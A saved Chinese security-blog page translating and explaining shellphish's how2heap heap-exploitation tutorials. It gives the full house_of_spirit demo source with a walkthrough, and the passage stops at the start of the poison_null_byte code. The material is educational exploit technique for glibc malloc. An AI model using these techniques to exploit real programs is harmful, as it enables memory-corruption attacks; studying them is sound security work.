<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】how2heap总结-下 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="heap,堆,exploitation,exploit"/>
    
        <meta name="description" content="我这段时间一直在学习堆漏洞利用方面的知识,看了这些利用技巧以后感觉受益匪浅. 这篇文章是我学习这个系列教程后的总结,在此和大家分享.我会尽量翻译原版教程的内容,方便英语不太好的同学学习. 不过在学习这些技巧之前,建议大家去看一看华庭写的“Glibc内存管理-Ptmalloc2源码分析”"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】how2heap总结-下</h2>
                <div class="article-msg">
                    <span class="time">2017-09-11 10:30:50</span>
                    
                                        <span class="read">阅读：6097次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_4383"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="4383" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2556795459" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01a4a92bb6151ed710.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2556795459" style="color:#848e99;">7o8v_</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center;"><img src="http://p8.qhimg.com/t014ed9b609168516b0.jpg" title="t010562ba50f1a44158.jpg" alt="http://p3.qhimg.com/t010562ba50f1a44158.jpg"/></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=2556795459" target="_self" style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">7o8v_</span></a></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">预估稿费：300RMB</span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x00 前言</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&quot;how2heap&quot;是shellphish团队在Github上开源的</span><strong style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">堆漏洞</strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">系列教程. 我这段时间一直在学习堆漏洞利用方面的知识,看了这些利用技巧以后感觉受益匪浅. 这篇文章是我学习这个系列教程后的总结,在此和大家分享.我会尽量翻译原版教程的内容,方便英语不太好的同学学习. 不过在学习这些技巧之前,建议大家去看一看华庭写的&quot;Glibc内存管理-Ptmalloc2源码分析&quot;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在此也给出原版教程链接:&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></span></p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">补充</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">上篇的总结因为在微信公众号发过了，所以不在这里发，可以到我的博客去看。博客：<a href="http://reversing.win" target="_self">reversing.win</a></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这次的翻译部分我决定再随性一点，每一句尽量使用我自己的理解。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">而且原文有些错误的地方或者表意不明的地方我会在翻译部分修正，要是原文看不太明白，可以看我的翻译。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后就是输出部分我就不贴了，大家想要学习的就自己在机器上输出看看。 :P</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x01 测试环境</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Ubuntu 16.04.3 LTS x64&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">GLIBC 2.23</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x02 目录</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">house_of_spirit</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">poison_null_byte</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">house_of_lore</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">overlapping_chunks</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">overlapping_chunks_2</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">house_of_force</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">unsoted_bin_attack</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">0x03 house_of_spirit</span></strong></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></strong></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">源码：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdlib.h&gt;

int&nbsp;main()
{
&nbsp;&nbsp;&nbsp;printf(&quot;This&nbsp;file&nbsp;demonstrates&nbsp;the&nbsp;house&nbsp;of&nbsp;spirit&nbsp;attack.\n&quot;);
&nbsp;&nbsp;&nbsp;printf(&quot;Calling&nbsp;malloc()&nbsp;once&nbsp;so&nbsp;that&nbsp;it&nbsp;sets&nbsp;up&nbsp;its&nbsp;memory.\n&quot;);
&nbsp;&nbsp;&nbsp;malloc(1);
&nbsp;&nbsp;&nbsp;printf(&quot;We&nbsp;will&nbsp;now&nbsp;overwrite&nbsp;a&nbsp;pointer&nbsp;to&nbsp;point&nbsp;to&nbsp;a&nbsp;fake&nbsp;&#39;fastbin&#39;&nbsp;region.\n&quot;);
&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;long&nbsp;*a;
&nbsp;&nbsp;&nbsp;//&nbsp;This&nbsp;has&nbsp;nothing&nbsp;to&nbsp;do&nbsp;with&nbsp;fastbinsY&nbsp;(do&nbsp;not&nbsp;be&nbsp;fooled&nbsp;by&nbsp;the&nbsp;10)&nbsp;-&nbsp;fake_chunks&nbsp;is&nbsp;just&nbsp;a&nbsp;piece&nbsp;of&nbsp;memory&nbsp;to&nbsp;fulfil&nbsp;allocations&nbsp;(pointed&nbsp;to&nbsp;from&nbsp;fastbinsY)
&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;long&nbsp;fake_chunks[10]&nbsp;__attribute__&nbsp;((aligned&nbsp;(16)));
&nbsp;&nbsp;&nbsp;printf(&quot;This&nbsp;region&nbsp;(memory&nbsp;of&nbsp;length:&nbsp;%lu)&nbsp;contains&nbsp;two&nbsp;chunks.&nbsp;The&nbsp;first&nbsp;starts&nbsp;at&nbsp;%p&nbsp;and&nbsp;the&nbsp;second&nbsp;at&nbsp;%p.\n&quot;,&nbsp;sizeof(fake_chunks),&nbsp;&amp;fake_chunks[1],&nbsp;&amp;fake_chunks[7]);
&nbsp;&nbsp;&nbsp;printf(&quot;This&nbsp;chunk.size&nbsp;of&nbsp;this&nbsp;region&nbsp;has&nbsp;to&nbsp;be&nbsp;16&nbsp;more&nbsp;than&nbsp;the&nbsp;region&nbsp;(to&nbsp;accomodate&nbsp;the&nbsp;chunk&nbsp;data)&nbsp;while&nbsp;still&nbsp;falling&nbsp;into&nbsp;the&nbsp;fastbin&nbsp;category&nbsp;(&lt;=&nbsp;128&nbsp;on&nbsp;x64).&quot;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;The&nbsp;PREV_INUSE&nbsp;(lsb)&nbsp;bit&nbsp;is&nbsp;ignored&nbsp;by&nbsp;free&nbsp;for&nbsp;fastbin-sized&nbsp;chunks,&nbsp;however&nbsp;the&nbsp;IS_MMAPPED&nbsp;(second&nbsp;lsb)&nbsp;and&nbsp;NON_MAIN_ARENA&nbsp;(third&nbsp;lsb)&nbsp;bits&nbsp;cause&nbsp;problems.\n&quot;);
&nbsp;&nbsp;&nbsp;printf(&quot;...&nbsp;note&nbsp;that&nbsp;this&nbsp;has&nbsp;to&nbsp;be&nbsp;the&nbsp;size&nbsp;of&nbsp;the&nbsp;next&nbsp;malloc&nbsp;request&nbsp;rounded&nbsp;to&nbsp;the&nbsp;internal&nbsp;size&nbsp;used&nbsp;by&nbsp;the&nbsp;malloc&nbsp;implementation.&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;E.g.&nbsp;on&nbsp;x64,&nbsp;0x30-0x38&nbsp;will&nbsp;all&nbsp;be&nbsp;rounded&nbsp;to&nbsp;0x40,&nbsp;so&nbsp;they&nbsp;would&nbsp;work&nbsp;for&nbsp;the&nbsp;malloc&nbsp;parameter&nbsp;at&nbsp;the&nbsp;end.&nbsp;\n&quot;);
&nbsp;&nbsp;&nbsp;fake_chunks[1]&nbsp;=&nbsp;0x40;&nbsp;//&nbsp;this&nbsp;is&nbsp;the&nbsp;size
&nbsp;&nbsp;&nbsp;printf(&quot;The&nbsp;chunk.size&nbsp;of&nbsp;the&nbsp;*next*&nbsp;fake&nbsp;region&nbsp;has&nbsp;to&nbsp;be&nbsp;sane.&nbsp;That&nbsp;is&nbsp;&gt;&nbsp;2*SIZE_SZ&nbsp;(&gt;&nbsp;16&nbsp;on&nbsp;x64)&nbsp;&amp;&amp;&nbsp;&lt;&nbsp;av-&gt;system_mem&nbsp;(&lt;&nbsp;128kb&nbsp;by&nbsp;default&nbsp;for&nbsp;the&nbsp;main&nbsp;arena)&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;to&nbsp;pass&nbsp;the&nbsp;nextsize&nbsp;integrity&nbsp;checks.&nbsp;No&nbsp;need&nbsp;for&nbsp;fastbin&nbsp;size.\n&quot;);
&nbsp;&nbsp;&nbsp;//&nbsp;fake_chunks[9]&nbsp;because&nbsp;0x40&nbsp;/&nbsp;sizeof(unsigned&nbsp;long&nbsp;long)&nbsp;=&nbsp;8
&nbsp;&nbsp;&nbsp;fake_chunks[9]&nbsp;=&nbsp;0x1234;&nbsp;//&nbsp;nextsize
&nbsp;&nbsp;&nbsp;printf(&quot;Now&nbsp;we&nbsp;will&nbsp;overwrite&nbsp;our&nbsp;pointer&nbsp;with&nbsp;the&nbsp;address&nbsp;of&nbsp;the&nbsp;fake&nbsp;region&nbsp;inside&nbsp;the&nbsp;fake&nbsp;first&nbsp;chunk,&nbsp;%p.\n&quot;,&nbsp;&amp;fake_chunks[1]);
&nbsp;&nbsp;&nbsp;printf(&quot;...&nbsp;note&nbsp;that&nbsp;the&nbsp;memory&nbsp;address&nbsp;of&nbsp;the&nbsp;*region*&nbsp;associated&nbsp;with&nbsp;this&nbsp;chunk&nbsp;must&nbsp;be&nbsp;16-byte&nbsp;aligned.\n&quot;);
&nbsp;&nbsp;&nbsp;a&nbsp;=&nbsp;&amp;fake_chunks[2];
&nbsp;&nbsp;&nbsp;printf(&quot;Freeing&nbsp;the&nbsp;overwritten&nbsp;pointer.\n&quot;);
&nbsp;&nbsp;&nbsp;free(a);
&nbsp;&nbsp;&nbsp;printf(&quot;Now&nbsp;the&nbsp;next&nbsp;malloc&nbsp;will&nbsp;return&nbsp;the&nbsp;region&nbsp;of&nbsp;our&nbsp;fake&nbsp;chunk&nbsp;at&nbsp;%p,&nbsp;which&nbsp;will&nbsp;be&nbsp;%p!\n&quot;,&nbsp;&amp;fake_chunks[1],&nbsp;&amp;fake_chunks[2]);
&nbsp;&nbsp;&nbsp;printf(&quot;malloc(0x30):&nbsp;%p\n&quot;,&nbsp;malloc(0x30));
}</pre><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 112, 192);">翻译：</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个程序展示了一种被称为<strong>house_of_spirit</strong>的攻击方式。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先调用一次<strong>malloc</strong>来初始化内存布局。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们将会修改一个指针去指向一个<strong>fake fastbin</strong>区域。</span></p><pre class="brush:cpp;toolbar:false">unsigned&nbsp;long&nbsp;long&nbsp;fake_chunks[10]&nbsp;__attribute__&nbsp;((aligned&nbsp;(16)));</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个区域长度为0x50，里面包含了两个chunk。第一个chunk开始于<strong>fake_chunk[0]</strong>,第二个chunk开始于<strong>fake_chunk[8]</strong>。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一个chunk的size要在fastbin的范围内（x64机器上是 &lt; 0x80），同时注意实际大小比可用大小多两个单元。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">因为这个chunk被我们伪装成了fastbin，所以<strong>PREV_INUSE</strong>是什么都无所谓（free的时候不会管这个标志位），但是<strong>IS_MMAPPED</strong>和<strong>NON_MAIN_ARENA</strong>两个标志位是会有影响的，确保为0就行。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还有需要注意的是，我们用<strong>malloc</strong>申请内存的时候，表示内存大小的参数最后是会因为对齐的操作，使得我们输入不同的参数可能都会返回同样大小的内存，比如在x64的机器上我们申请<strong>0x30~0x38</strong>大小的内存，最后都会返回给我们<strong>0x40</strong>大小的内存。所以，如果我们想要一个0x40大小的内存，上面表示的大小范围内的值都可以作为malloc的参数。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还有就是第二个fake chunk的size必须要大于<strong>2*size_t</strong>（x64机器上是16字节），且必须小于main arena的大小，一般来讲是128kb，以此来pass掉chunk是否正常的检查。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后我们将要free的指针的值改为fake chunk的地址<strong>fake_chunk[2]</strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还有一点比较重要，fake chunk的地址必须是16字节对齐（x86机器上是8字节对齐）。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于我们的fake chunk伪造的size值为0x40,所以之后malloc(0x30~0x38)都会返回<strong>fake_chunk[2]</strong>的地址。</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192);">需要注意的是，这个示例中的fake chunk是布置在栈上的。</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里我画一张图来帮助理解:</span></p><p style="text-align: center;"><img src="http://p2.qhimg.com/t01ae03babb8f9d7744.png" alt=""/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">构造fake_chunk_1的目的是我们最后要返回它的指针来控制这片区域；而构造fake_chunk_2的目的是为了pass掉free()的检查使得我们可以成功返回fake_chunk_1的指针。 free之后的效果是这样的：</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p0.qhimg.com/t0127eeae6489c60fcf.png" alt=""/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">栈地址被成功放到了fastbin的链表上，之后就能把它malloc出来了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当我们伪造的fake chunk内部存在不可控区域的时候，运用这个技术就可以将这片区域变成可控的了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">关于这个技术如果要练手的话，可以去做一下 pwnable.tw 上的 spirited_away 这道题。(后续我会将解题思路放到我的博客，可能不会放wp。)</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x04 poison_null_byte</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">源码：</span></p><pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
#include&nbsp;&lt;string.h&gt;
#include&nbsp;&lt;stdint.h&gt;
#include&nbsp;&lt;malloc.h&gt;


int&nbsp;main()
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Welcome&nbsp;to&nbsp;poison&nbsp;null&nbsp;byte&nbsp;2.0!\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Tested&nbsp;in&nbsp;Ubuntu&nbsp;14.04&nbsp;64bit.\n&quot;);
